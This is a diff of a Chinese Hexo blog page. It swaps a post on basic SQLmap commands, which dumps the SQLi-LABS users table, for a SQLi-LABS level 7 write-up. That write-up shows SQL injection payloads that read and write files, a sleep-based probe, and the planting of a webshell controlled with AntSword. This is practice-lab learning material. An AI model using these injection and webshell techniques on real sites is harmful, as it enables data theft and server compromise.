@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQLmap基本指令, Hexo">
+    <meta name="keywords" content="SQLi-LABS 7, Hexo">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQLmap基本指令 | Hexo</title>
+    <title>SQLi-LABS 7 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQLmap基本指令</h1>
+                    <h1 class="description center-align post-title">SQLi-LABS 7</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-02
+                    2020-12-03
                 </div>
                 
 
@@ -459,33 +459,48 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="SQLmap指令区分大小写！！！"><a href="#SQLmap指令区分大小写！！！" class="headerlink" title="SQLmap指令区分大小写！！！"></a><u><em>SQLmap指令区分大小写！！！</em></u></h4><h3 id="1-GET注入"><a href="#1-GET注入" class="headerlink" title="1.GET注入"></a>1.GET注入</h3><h4 id="①判断是否存在注入点"><a href="#①判断是否存在注入点" class="headerlink" title="①判断是否存在注入点"></a>①判断是否存在注入点</h4><p>python sqlmap.py -u “URL/?参数”</p>
-<p>-u参数指定URL</p>
-<p>如果存在注入点则会爆出web容器和数据库版本信息</p>
-<p>如：</p>
-<p>web application technology: PHP 5.5.9, Apache 2.4.39<br>back-end DBMS: MySQL &gt;= 5.6</p>
-<h4 id="②进行爆数据库"><a href="#②进行爆数据库" class="headerlink" title="②进行爆数据库"></a>②进行爆数据库</h4><p>python sqlmap.py -u “URL/?参数” –dbs</p>
-<p>-dbs读取数据库</p>
-<p>如：</p>
-<p>available databases [6]:<br>[<em>] challenges<br>[</em>] information_schema<br>[*] mysql<br>[*] performance_schema<br>[*] security<br>[*] sys</p>
-<p>python sqlmap.py -u “URL/?参数” –current -db</p>
-<p>–current-db参数列出当前应用程序所使用的数据库</p>
-<p>如：</p>
-<p>current database: ‘security’</p>
-<h4 id="③爆表名"><a href="#③爆表名" class="headerlink" title="③爆表名"></a>③爆表名</h4><p>python sqlmap.py -u “URL/?参数” –tables -D “security”</p>
-<p>-D参数指定数据库</p>
-<p>如：</p>
-<p>Database: security<br>[4 tables]<br>+———-+<br>| emails   |<br>| referers |<br>| uagents  |<br>| users    |<br>+———-+</p>
-<h4 id="④爆字段名"><a href="#④爆字段名" class="headerlink" title="④爆字段名"></a>④爆字段名</h4><p>python sqlmap.py -u “URL/?参数” –columns -T “users” -D “security”</p>
-<p>-T参数指定表名</p>
-<p>如：</p>
-<p>Database: security<br>Table: users<br>[3 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| id       | int(3)      |<br>| password | varchar(20) |<br>| username | varchar(20) |<br>+———-+————-+</p>
-<h4 id="⑤爆数据"><a href="#⑤爆数据" class="headerlink" title="⑤爆数据"></a>⑤爆数据</h4><p>python sqlmap.py -u “URL/?参数” –dump -C “id,username,password” -T “users” -D “security”</p>
-<p>–dump 参数意为转存数据</p>
-<p>-C参数指定字段名</p>
-<p>如：</p>
-<p>Database: security<br>Table: users<br>[13 entries]<br>+—-+———-+————+<br>| id | username | password   |<br>+—-+———-+————+<br>| 1  | Dumb     | Dumb       |<br>| 2  | Angelina | I-kill-you |<br>| 3  | Dummy    | p@ssword   |<br>| 4  | secure   | crappy     |<br>| 5  | stupid   | stupidity  |<br>| 6  | superman | genious    |<br>| 7  | batman   | mob!le     |<br>| 8  | admin    | chen       |<br>| 9  | admin1   | admin1     |<br>| 10 | admin2   | admin2     |<br>| 11 | admin3   | admin3     |<br>| 12 | dhakkan  | dumbo      |<br>| 14 | admin4   | admin4     |<br>+—-+———-+————+</p>
-<h3 id="2-POST注入"><a href="#2-POST注入" class="headerlink" title="2.POST注入"></a>2.POST注入</h3>
+                <h4 id="这一关是进行文件导入注入"><a href="#这一关是进行文件导入注入" class="headerlink" title="这一关是进行文件导入注入"></a>这一关是进行文件导入注入</h4><h4 id="①前提条件："><a href="#①前提条件：" class="headerlink" title="①前提条件："></a>①前提条件：</h4><ul>
+<li>要有文件读写权限。</li>
+</ul>
+<pre><code>and (select count(*) from mysql.user)&gt;0</code></pre>
+<p>如果返回正常，说名拥有权限。如果返回错误，则需要进行提权操作。</p>
+<ul>
+<li><p>必须拥有预读取文件的绝对路径。相对路径不行</p>
+</li>
+<li><p>欲读取文件要小于max_allowed_packet</p>
+</li>
+<li><p>预读取文件必须在服务器上</p>
+</li>
+</ul>
+<h4 id="②函数介绍"><a href="#②函数介绍" class="headerlink" title="②函数介绍"></a>②函数介绍</h4><ul>
+<li>into outfile() 写入文件（文件为不存在的文件）</li>
+</ul>
+<pre><code>select ....into outfile &quot;flie_name&quot;`</code></pre>
+<pre><code>id=1&#39;)) union select 1,2,&quot;内容&quot; into outfile &quot;路径\\文件名&quot;</code></pre>
+<p>虽然页面还是会报错，但进入文件夹会发现文件已经生成写入。</p>
+<ul>
+<li>Load_file(file_name)读取文件</li>
+</ul>
+<pre><code>id=1&#39;)) union select 1,2,load_life(路径文件)</code></pre>
+<h4 id="③注入"><a href="#③注入" class="headerlink" title="③注入"></a>③注入</h4><ul>
+<li>注入点判断</li>
+</ul>
+<p>这里我是用延时注入进行判断</p>
+<pre><code>?id=1&#39;)) and sleep(3) --+</code></pre>
+<p>正确会3秒后刷新页面。</p>
+<ul>
+<li>列数判断 </li>
+</ul>
+<p>order by 数字</p>
+<ul>
+<li>拥有权限，恶意文件写入</li>
+</ul>
+<pre><code>union select 1,&quot;     &quot;,3 into outflie &quot;           &quot; --+  路径使用双斜杆\\防止转义</code></pre>
+<ul>
+<li>写入成功连接蚁剑</li>
+<li>控制webshell行进文件删减等操作。</li>
+</ul>
+
             </div>
             <hr/>
 
@@ -510,7 +525,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2020/12/02/SQLmap%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4/">http://example.com/2020/12/02/SQLmap%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4/</a>
+                    <a href="http://example.com/2020/12/03/SQLi-LABS-7/">http://example.com/2020/12/03/SQLi-LABS-7/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -715,9 +730,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/12/03/SQLi-LABS-7/">
                     <div class="card-image">
@@ -735,9 +751,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -746,6 +762,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -756,13 +773,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/01/SQL23-38/">
+                <a href="/2020/12/02/SQLmap%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SQL23-38">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="SQLmap基本指令">
                         
-                        <span class="card-title">SQL23-38</span>
+                        <span class="card-title">SQLmap基本指令</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -773,7 +790,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-02
                             </span>
                         <span class="publish-author">
                             
